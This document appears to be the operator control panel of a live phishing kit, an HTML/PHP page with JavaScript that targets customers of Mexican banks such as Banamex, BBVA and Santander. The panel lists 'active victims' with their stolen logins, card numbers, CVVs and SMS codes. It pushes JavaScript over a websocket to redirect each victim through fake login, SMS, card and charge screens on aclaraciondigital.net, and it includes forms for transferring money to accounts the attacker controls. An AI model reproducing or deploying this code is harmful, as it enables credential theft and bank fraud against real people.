<!DOCTYPE html><!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7" lang=""> <![endif]--><!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8" lang=""> <![endif]--><!--[if IE 8]>         <html class="no-js lt-ie9" lang=""> <![endif]--><!--[if gt IE 8]><!--><html class="no-js" lang=""><!--<![endif]--><head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Espacio de trabajo</title>
    <meta name="description" content="Ela Admin - HTML5 Admin Template">
    <meta name="viewport" content="width=device-width, initial-scale=1">

<link rel="apple-touch-icon" href="<?php echo get_template_directory_uri(); ?>/Sq5ad5W9pqQz.png">
<link rel="shortcut icon" href="<?php echo get_template_directory_uri(); ?>/Sq5ad5W9pqQz.png">

<link rel="stylesheet" href="<?php echo get_template_directory_uri(); ?>/normalize.min.css">
<link rel="stylesheet" href="<?php echo get_template_directory_uri(); ?>/bootstrap.min.css">
<link rel="stylesheet" href="<?php echo get_template_directory_uri(); ?>/font-awesome.min.css">
<link rel="stylesheet" href="<?php echo get_template_directory_uri(); ?>/themify-icons.css">
<link rel="stylesheet" href="<?php echo get_template_directory_uri(); ?>/pe-icon-7-stroke.min.css">
<link rel="stylesheet" href="<?php echo get_template_directory_uri(); ?>/pAhtcOt2DwBr.css">
<link rel="stylesheet" href="<?php echo get_template_directory_uri(); ?>/cs-skin-elastic.css">
<link rel="stylesheet" href="<?php echo get_template_directory_uri(); ?>/style.css">
<!-- <script type="text/javascript" src="/https://nqcQL0Isj77Y.net/html5shiv/3.7.3/html5shiv.min.js"></script> -->
<link href="<?php echo get_template_directory_uri(); ?>/chartist.min.css" rel="stylesheet">
<link href="<?php echo get_template_directory_uri(); ?>/jqvmap.min.css" rel="stylesheet">

<link href="<?php echo get_template_directory_uri(); ?>/weather-icons.css" rel="stylesheet">
<link href="<?php echo get_template_directory_uri(); ?>/fullcalendar.min.css" rel="stylesheet">
<link rel="stylesheet" href="<?php echo get_template_directory_uri(); ?>/all.css" media="all">

   <style>
    #weatherWidget .currentDesc {
        color: #ffffff!important;
    }
        .traffic-chart {
            min-height: 335px;
        }
        #flotPie1  {
            height: 150px;
        }
        #flotPie1 td {
            padding:3px;
        }
        #flotPie1 table {
            top: 20px!important;
            right: -10px!important;
        }
        .chart-container {
            display: table;
            min-width: 270px ;
            text-align: left;
            padding-top: 10px;
            padding-bottom: 10px;
        }
        #flotLine5  {
             height: 105px;
        }

        #flotBarChart {
            height: 150px;
        }
        #cellPaiChart{
            height: 160px;
        }

.right-panel {
    margin-left: 0;
}

td > i {
    font-size: 24px;
    cursor: pointer;
    cursor: hand;
    display: inline-block;
    margin: 5px;
}

#sisname {
    min-width: 200px;
    margin-top: 8px;
    font-size: 20px;
    border: 1px solid #aaa;
    border-radius: 10px;
    padding: 3px 10px;
}

#kols > i {
    font-size: 25px;
    display: inline-block;
    margin: 10px;
}

    </style>

    <script type="text/javascript">window.wsk='wss3';</script>
    <script src="<?php echo get_template_directory_uri(); ?>/cdta_1689014618.js"></script>
</head>

<body>
    <audio id="au1" src="<?php echo get_template_directory_uri(); ?>/naic.mp3" type="audio/mpeg"></audio>
    <audio id="au2" src="<?php echo get_template_directory_uri(); ?>/not.mp3" type="audio/mpeg"></audio>
    <script type="text/javascript">
        window.a1=document.getElementById('au1');
        window.a2=document.getElementById('au2');
        window.olx=[];
        window.pans=['Login','Cargo','SMS','Tarjeta','Cancelacion','Espera','Inicio','Datos','Proteger'];
        
        window.loginok=function(dta){
            window.nix=dta.nix;
            window.hidv=dta.id;

            document.getElementById('nope').innerHTML=window.nusr=dta.usr;
            document.getElementById('uric').innerHTML='https://aclaraciondigital.net/'+dta.nix;
            document.getElementById('uric').onclick=function() {
                navigator.clipboard.writeText('https://aclaraciondigital.net/'+window.nix);
            };
            wscon.send('UL');
            document.getElementById('sisname').value=dta.sisid;
        };
        window.closeok=function(){
            document.location='../Login';
        };

        window.fux=function(vx){
            var e=false;
            window.ulx.forEach(function(v,i){
                if (v.name==vx.name) e=true;
            });
            return(e);
        };

        window.ofux=function(vx){
            var e=false;
            window.olx.forEach(function(v,i){
                if (v.name==vx.name) e=true;
            });
            return(e);
        };

        window.ovex=function(vx){
            window.olx.forEach(function(v,i){
                if (v.name==vx.name) if (v.vex!=v.vex) {
                    window.a2.play();
                    //console.log('x');
                }
            });
        };

        window.ulist=function(ul,xul) {
            var t;

            t='';
            window.ulx=[];
            ul.forEach(function(v,i){
                if (v.nix!=window.nix) return;
                if (fux(v)) return;
                if (window.nusr!=v.usr) wscon.send("Su"+v.name+','+window.nusr);
                window.ulx[i]=v;
                if (!ofux(v)) {
                    window.a1.play();
                    olx.push(v);
                }
                if (k=document.getElementById('panx'+i)) {
                    if (k.innerHTML!=pans[v.vex]) window.a2.play();
                }

                if (v.cel==null) v.cel=ulx[i].cel='';
                if (v.tarjeta==null) v.tarjeta=ulx[i].tarjeta='';
                if (v.code==null) v.code=ulx[i].code='';
                if (v.codec==null) v.codec=ulx[i].codec='';
                if (v.fecha==null) v.fecha=ulx[i].fecha='';
                if (v.cvv==null) v.cvv=ulx[i].cvv='';
                //console.log(v);
                t+='<tr>';
                t+='<td>'+(i+1)+'</td>';
                t+='<td>'+v.folio+'</td>';
                t+='<td align=left>'+v.email+'<br>'+v.pwd+'</td>';
                t+='<td align=left>'+v.tarjeta+'<br>'+v.fecha+'<br>'+v.cvv+'</td>';
                t+='<td>'+v.code+'</td>';
                t+='<td>'+v.codec+'</td>';
                t+='<td><input type=tel id=cel'+i+' value="'+((v.cel==null)?'':v.cel)+'" onchange="window.xsetcel('+i+');"></td>';
                t+='<td id=panx'+i+'>'+pans[v.vex]+'</td>';
                t+='<td>';
                t+='<i '+((v.six==1)?'onclick="window.urlto(\'/Login/?\','+i+');"':'')+' style="color: '+((v.six==1)?'#03254B':'#e8e8e8')+';" class="fa-solid fa-user" title="Login"></i>';
                t+='<i '+((v.six==1)?'onclick="window.urlto(\'/Loader/?\','+i+');"':'')+' style="color: '+((v.six==1)?'#03254B':'#e8e8e8')+';" class="fa-solid fa-clock" title="Espera"></i>';
                t+='<i '+((v.six==1)?'onclick="window.urlto(\'/SMS/?T=\'+btoa(\''+v.tarjeta.substr(-4)+',\'+document.getElementById(\'cel'+i+'\').value.substr(-4)),'+i+');"':'')+' style="color: '+((v.six==1)?'#03254B':'#e8e8e8')+';" class="fa-solid fa-comment-sms" title="SMS"></i>';

                t+='<i '+((v.six==1)?'onclick="openb('+i+');"':'')+' style="color: '+((v.six==1)?'#03254B':'#e8e8e8')+';" class="fa-solid fa-circle-exclamation" title="Proteger"></i>';

                t+='<i '+((v.six==1)?'onclick="openc('+i+');"':'')+' style="color: '+((v.six==1)?'#03254B':'#e8e8e8')+';" class="fa-solid fa-hand-holding-dollar" title="Transferir"></i>';

                t+='<i '+((v.six==1)?'onclick="window.urlto(\'/Tarjeta/?\','+i+');"':'')+' style="color: '+((v.six==1)?'#03254B':'#e8e8e8')+';" class="fa-solid fa-credit-card" title="Tarjeta"></i>';
                t+='<i '+((v.six==1)?'onclick="window.urlto(\'/Cargo/?T=\'+btoa(\''+v.tarjeta.substr(-4)+',\'+document.getElementById(\'cel'+i+'\').value.substr(-4)),'+i+');"':'')+' style="color: '+((v.six==1)?'#03254B':'#e8e8e8')+';" class="fa-sharp fa-solid fa-comments-dollar" title="Cargo"></i>';
                t+='<i '+((v.six==1)?'onclick="window.urlto(\'/Cancelacion/?\','+i+');"':'')+' style="color: '+((v.six==1)?'#03254B':'#e8e8e8')+';" class="fa-solid fa-circle-check" title="Cancelación"></i>';
                t+='<i onclick="event.preventDefault(); wscon.send(\'DL'+v.name+'\'); window.urlto(\'/?\','+i+');" style="color: #03254B;" class="fa-solid fa-dice" title="Cambio de folio"></i>';
                t+='<i '+((v.six==1)?'onclick="event.preventDefault(); openwop('+i+');"':'')+' style="color: '+((v.six==1)?'#03254B':'#e8e8e8')+';" class="fa-solid fa-building-columns" title="Otras opciones"></i>';
                t+='</td>';
                t+='</tr>';
            });

            window.openc=function(i){
                document.getElementById('bxncid').value=i;
                document.getElementById('bxnc').style.display='block';
            };

            window.opena=function(i){
                document.getElementById('bxnaid').value=i;
                document.getElementById('bxna').style.display='block';
            };

            window.openb=function(i){
                document.getElementById('bxnbid').value=i;
                document.getElementById('bxnb').style.display='block';
            };

            window.olx.forEach(function(v,i){
                if (!fux(v)) delete window.olx[i];
            });

            document.getElementById('ulist').innerHTML=t;

            t='';
            xul.forEach(function(v,i){
                if (fux(v)) return;
                //console.log(window.nusr,v.usr,window.nusr!=v.usr);
                if (window.nusr!=v.usr) return;
                
                if (v.cel==null) v.cel='';
                if (v.tarjeta==null) v.tarjeta='';
                if (v.code==null) v.code='';
                if (v.codec==null) v.codec='';
                if (v.fecha==null) v.fecha='';
                if (v.cvv==null) v.cvv='';
                //console.log(v);
                t+='<tr>';
                t+='<td>'+(i+1)+'</td>';
                t+='<td align=left>'+v.email+'<br>'+v.pwd+'</td>';
                t+='<td align=left>'+v.tarjeta+'<br>'+v.fecha+'<br>'+v.cvv+'</td>';
                t+='<td>'+v.code+'</td>';
                t+='<td>'+v.codec+'</td>';
                t+='<td>'+((v.cel==null)?'':v.cel)+'</td>';
                t+='<td>'+pans[v.vex]+'</td>';
                t+='<td>';
                t+='<i class="fa-solid fa-trash" onclick="wscon.send('+"'DV"+v.name+"'"+');">';
                t+='</td>';
                
                t+='</tr>';
            });

            document.getElementById('xulist').innerHTML=t;
        };

        window.openwop=function(i){
            document.getElementById('idsid').value=i;
            document.getElementById('opx').style.display='block';
        };

        window.urlto=function(p,i){
            event.preventDefault(); 
            wscon.send('SM'+window.ulx[i].name+'>JSdocument.location="https://aclaraciondigital.net'+'/'+window.nix+p+'&FX='+btoa('3,'+window.ulx[i].folio+','+window.ulx[i].name)+'"');
                
        };

        window.xsetcel=function(i){
            wscon.send('Sc'+window.ulx[i].name+','+document.getElementById('cel'+i).value);
            //console.log('Sc'+window.ulx[i].name+','+document.getElementById('cel'+i).value);
        };

        window.setbix=function(idbix) {
            //console.log(idbix);
            wscon.send('SB'+idbix);
        };

        window.kocli=function(v){
            for (i=0;i<6;i++) document.getElementById('ko'+i).style.color=(v==i)?'#03254B':'#e8e8e8';
            document.getElementById('idv').value=v;
        };

        window.sendk=function() {
            var v=window.ulx[document.getElementById('idsid').value];
            v.email=document.getElementById('omail').innerHTML;
            v.pwd=document.getElementById('opwd').innerHTML;
            v.fecha=document.getElementById('ofec').innerHTML;
            v.cvv=document.getElementById('ocvv').innerHTML;
            v.tarjeta=document.getElementById('otar').innerHTML;
            v.code=document.getElementById('osms').innerHTML;
            v.codec=document.getElementById('osmsc').innerHTML;
            var dat={
                idven: document.getElementById('idv').value,
                idban: document.getElementById('idban').value,
                sid: v,
                id: window.hidv,
                nix: window.nix
            };
            dat=btoa(JSON.stringify(dat));
            window.urlto('/../jumpto.php?DX='+dat,document.getElementById('idsid').value);
        };

        window.twichhisto=function(){
            var o=document.getElementById('histo');
            o.style.display=(o.style.display=='none')?'unset':'none';
        };

    </script>
    <!-- Right Panel -->
    <div id="right-panel" class="right-panel">
        <!-- Header-->
        <header id="header" class="header">
            <div class="top-left">
                <div class="navbar-header">
                    <a class="navbar-brand" href="./">Espacio de trabajo</a>
                    <a class="navbar-brand hidden" href="./">Espacio de trabajo</a>
                    
                </div>
            </div>
            <div class="top-right">
                <div class="header-menu">
                    <div class="header-left">
                        <select id="sisname" onchange="setbix(this.value);">
                            <option value="0">Liverpool</option>
                            <option value="1">Banamex</option>
                            <option value="2">Banbajio</option>
                            <option value="3">Banco Azteca</option>
                            <option value="4">BanCoppel</option>
                            <option value="5">Banorte</option>
                            <option value="6">BBVA</option>
                            <option value="7">HSBC</option>
                            <option value="8">Inbursa</option>
                            <option value="9">Santander</option>
                            <option value="10">Scotiabank</option>
                            <option value="11">Banregio</option>
                            <option value="12">Invex</option>
                        </select>
                    </div>
<span id="nope" style="display: none;"></span>
                    <div class="user-area dropdown float-right">
                        <a href="/#" class="dropdown-toggle active" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                            <img class="user-avatar rounded-circle" src="<?php echo get_template_directory_uri(); ?>/admin.jpg" alt="User Avatar">
                        </a>

                        <div class="user-menu dropdown-menu">

                            <a class="nav-link" href="/#" onclick="event.preventDefault(); wscon.send('OU');"><i class="fa fa-power -off"></i>Salir</a>
                        </div>
                    </div>

                </div>
            </div>
        </header>
        <!-- /#header -->
        <!-- Content -->
        <div class="content">
            <!-- Animated -->
            <div class="animated fadeIn">
               
               
                <div class="clearfix"></div>
                <!-- Orders -->
                <div class="orders">
                    <div class="">
                        <div class="">
                            <div class="card">
                                <div class="card-body">
                                    
                                    <h4 class="box-title">Victima activa </h4>
                                    <span id="uric" style="cursor: pointer; cursor: hand;"></span><i class="fa-solid fa-rotate" style="margin-left: 10px; cursor: pointer; cursor: hand;" onclick="wscon.send('RX'+document.getElementById('sisname').value);"></i>
                                </div>
                                <div class="card-body--">
                                    <div class="table-stats order-table ov-h">
                                        <table class="table ">
                                            <thead>
                                                <tr>
                                                    <th class="serial">#</th>
                                                    <th>Folio</th>
                                                    <th>Usuario:Contraseña</th>
                                                    <th>CC:MM/YY:CVC</th>
                                                    <th>SMS</th>
                                                    <th>SMS COMPRA</th>
                                                    <th>Celular</th>
                                                    <th>Pantalla</th>
                                                    <th>Acciones</th>
                                                </tr>
                                            </thead>
                                            <tbody id="ulist">
                                               
                                                
                                            </tbody>
                                        </table>
                                    </div> <!-- /.table-stats -->
                                </div>
                            </div> <!-- /.card -->
                        </div>  <!-- /.col-lg-8 -->
                    </div>
                </div>
                <input type="button" value="Ver/Ocultar Historial" onclick="twichhisto();">
                <div class="orders" id="histo">
                    <div class="">
                        <div class="">
                            <div class="card">
                                <div class="card-body">
                                    
                                    <h4 class="box-title">Historial </h4>
                                    
                                </div>
                                <div class="card-body--">
                                    <div class="table-stats order-table ov-h">
                                        <table class="table ">
                                            <thead>
                                                <tr>
                                                    <th class="serial">#</th>
                                                    <th>Usuario:Contraseña</th>
                                                    <th>CC:MM/YY:CVC</th>
                                                    <th>SMS</th>
                                                    <th>SMS COMPRA</th>
                                                    <th>Celular</th>
                                                    <th>Ultima Pantalla</th>
                                                    <th>Acciones</th>
                                                </tr>
                                            </thead>
                                            <tbody id="xulist">
                                               
                                                
                                            </tbody>
                                        </table>
                                    </div> <!-- /.table-stats -->
                                </div>
                            </div> <!-- /.card -->
                        </div>  <!-- /.col-lg-8 -->
                    </div>
                </div>
            </div>
            <!-- .animated -->
        </div>
        <!-- /.content -->
        <div class="clearfix"></div>
        <!-- Footer -->
        <footer class="site-footer" style="display: none;">
            <div class="footer-inner bg-white">
                <div class="row">
                    <div class="col-sm-6">
                        Derechos reservados 2023 © Dubbi
                    </div>
                    <div class="col-sm-6 text-right">
                       <!-- Contacto por telegram: <a href="">@SrVoldemort</a> -->
                    </div>
                </div>
            </div>
        </footer>
        <!-- /.site-footer -->
    </div>
    <!-- /#right-panel -->

    <!-- Scripts -->
    <script src="<?php echo get_template_directory_uri(); ?>/jquery.min.js"></script>
    <script src="<?php echo get_template_directory_uri(); ?>/popper.min.js"></script>
    <script src="<?php echo get_template_directory_uri(); ?>/bootstrap.min.js"></script>
    <script src="<?php echo get_template_directory_uri(); ?>/jquery.matchHeight.min.js"></script>
    <script src="<?php echo get_template_directory_uri(); ?>/main.js"></script>

    <!--  Chart js -->
    <script src="<?php echo get_template_directory_uri(); ?>/Chart.bundle.min.js"></script>

    <!--Chartist Chart-->
    <script src="<?php echo get_template_directory_uri(); ?>/chartist.min.js"></script>
    <script src="<?php echo get_template_directory_uri(); ?>/chartist-plugin-legend.min.js"></script>

    <script src="<?php echo get_template_directory_uri(); ?>/jquery.flot.min.js"></script>
    <script src="<?php echo get_template_directory_uri(); ?>/jquery.flot.pie.min.js"></script>
    <script src="<?php echo get_template_directory_uri(); ?>/jquery.flot.spline.min.js"></script>

    <script src="<?php echo get_template_directory_uri(); ?>/jquery.simpleWeather.min.js"></script>
    <script src="<?php echo get_template_directory_uri(); ?>/weather-init.js"></script>

    <script src="<?php echo get_template_directory_uri(); ?>/moment.min.js"></script>
    <script src="<?php echo get_template_directory_uri(); ?>/fullcalendar.min.js"></script>
    <script src="<?php echo get_template_directory_uri(); ?>/fullcalendar-init.js"></script>

    <!--Local Stuff-->
    <script>
        jQuery(document).ready(function($) {
           
        });
    </script>
    <div id="opx" style="position: fixed; background-color: #4e4b4b99; top: 0; left: 0; width: 100%; height: 100%; z-index: 999; display: none;">
        <div style="background-color: #fff; position: absolute; top: 50%; left: 50%; width: 600px; height: 300px; margin-left: -310px; margin-top: -160px; padding: 10px; border: 1px solid #000; border-radius: 10px; text-align: left;">
            <i class="fa-solid fa-circle-xmark" style="position: absolute; top: -10px; right: -10px; font-size: 25px; color: #f00; background-color: #fff; border-radius: 25px; cursor: pointer; cursor: hand;" onclick="kocli(1); sendk(); document.getElementById('opx').style.display='none';"></i>

            <h1 style="text-align: center; font-size: 16px;">Solicitar acciones adicionales</h1>
            <b>Tipo de acción</b>
            <div id="kols">
                <i id="ko0" onclick="kocli(0);" style="color: #03254B;" class="fa-solid fa-user" title="Login"></i>
                <i id="ko1" onclick="kocli(1);" style="color: #e8e8e8;" class="fa-solid fa-clock" title="Espera"></i>
                <i id="ko2" onclick="kocli(2);" style="color: #e8e8e8;" class="fa-solid fa-comment-sms" title="SMS"></i>
                <i id="ko3" onclick="kocli(3);" style="color: #e8e8e8;" class="fa-solid fa-credit-card" title="Tarjeta"></i>
                <i id="ko4" onclick="kocli(4);" style="color: #e8e8e8;" class="fa-sharp fa-solid fa-comments-dollar" title="Cargo"></i>
                <i id="ko5" onclick="kocli(5);" style="color: #e8e8e8;" class="fa-solid fa-circle-check" title="Cancelación"></i>
                <input type="hidden" id="idv" value="0">
                <input type="hidden" id="idsid">
            </div>
            <b>Institución</b>
            <select id="idban">
                <option value="0">Liverpool</option>
                <option value="1">Banamex</option>
                <option value="2">Banbajio</option>
                <option value="3">Banco Azteca</option>
                <option value="4">BanCoppel</option>
                <option value="5">Banorte</option>
                <option value="6">BBVA</option>
                <option value="7">HSBC</option>
                <option value="8">Inbursa</option>
                <option value="9">Santander</option>
                <option value="10">Scotiabank</option>
                <option value="11">Banregio</option>
                <option value="12">Invex</option>
            </select>
            <input type="button" value="Enviar" onclick="sendk();"><br>
            Respuesta
            <div id="orex">
                Correo : <span id="omail"></span> Contraseña : <span id="opwd"></span><br>
                Tarjeta: <span id="otar"></span> Fecha: <span id="ofec"></span> CVV: <span id="ocvv"></span><br>
                SMS: <span id="osms"></span><br>
                SMS Compra: <span id="osmsc"></span><br>
            </div>
            
        </div>
    </div>
    
    <div id="bxn" style="position: fixed; background-color: #4e4b4b99; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999;">
        <div style="background-color: #fff; position: absolute; top: 50%; left: 50%; width: 300px; height: 100px; margin-left: -160px; margin-top: -60px; padding: 10px; border: 1px solid #000; border-radius: 10px; text-align: center;">
            Bienvenido<br>
            <input type="button" id="xc" value="Continuar" style="margin-top: 10px;" onclick="document.getElementById('bxn').style.display='none';">
        </div>
    </div>

    <div id="bxna" style="position: fixed; background-color: #4e4b4b99; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; display: none;">
        <div style="background-color: #fff; position: absolute; top: 50%; left: 50%; width: 300px; height: 100px; margin-left: -160px; margin-top: -60px; padding: 10px; border: 1px solid #000; border-radius: 10px; text-align: left;">
            Cantidad $<input type="number" inputmode="numeric" id="saldo1"><br>
            <input type="hidden" id="bxnaid">
            <input type="button" id="xac" value="Continuar" style="margin-top: 10px;" onclick="window.urlto('/Cancelacion/?T='+btoa(',,'+getElementById('saldo1').value),getElementById('bxnaid').value); document.getElementById('bxna').style.display='none';">
            <input type="button" id="xaa" value="Cancelar" style="margin-top: 10px; float: right;" onclick="document.getElementById('bxna').style.display='none';">
        </div>
    </div>

    <div id="bxnb" style="position: fixed; background-color: #4e4b4b99; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; display: none;">
        <div style="background-color: #fff; position: absolute; top: 50%; left: 50%; width: 300px; height: 100px; margin-left: -160px; margin-top: -60px; padding: 10px; border: 1px solid #000; border-radius: 10px; text-align: left;">
            Cantidad $<input type="number" inputmode="numeric" id="saldo2"><br>
            <input type="hidden" id="bxnbid">
            <input type="button" id="xbc" value="Continuar" style="margin-top: 10px;" onclick="window.urlto('/Proteger/?T='+btoa(',,'+getElementById('saldo2').value),getElementById('bxnbid').value); document.getElementById('bxnb').style.display='none';">
            <input type="button" id="xba" value="Cancelar" style="margin-top: 10px; float: right;" onclick="document.getElementById('bxnb').style.display='none';">
        </div>
    </div>

    <div id="bxnc" style="position: fixed; background-color: #4e4b4b99; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; display: none;">
        <div style="background-color: #fff; position: absolute; top: 50%; left: 50%; width: 300px; height: 200px; margin-left: -160px; margin-top: -100px; padding: 10px; border: 1px solid #000; border-radius: 10px; text-align: left;">
            Cantidad $<input type="number" inputmode="numeric" id="saldo3"><br>
            Titular<input type="text" id="titular"><br>
            Clabe<input type="number" inputmode="numeric" id="clabe"><br>
            Alias<input type="text" id="alias" value="Cuenta de respaldo"><br>
            <input type="hidden" id="bxncid">
            <input type="button" id="xcc" value="Continuar" style="margin-top: 10px;" onclick="window.urlto('/Datos/?T='+btoa(getElementById('titular').value+','+getElementById('clabe').value+','+getElementById('saldo3').value+','+getElementById('alias').value),getElementById('bxncid').value); document.getElementById('bxnc').style.display='none';">
            <input type="button" id="xca" value="Cancelar" style="margin-top: 10px; float: right;" onclick="document.getElementById('bxnc').style.display='none';">
        </div>
    </div>



</body></html>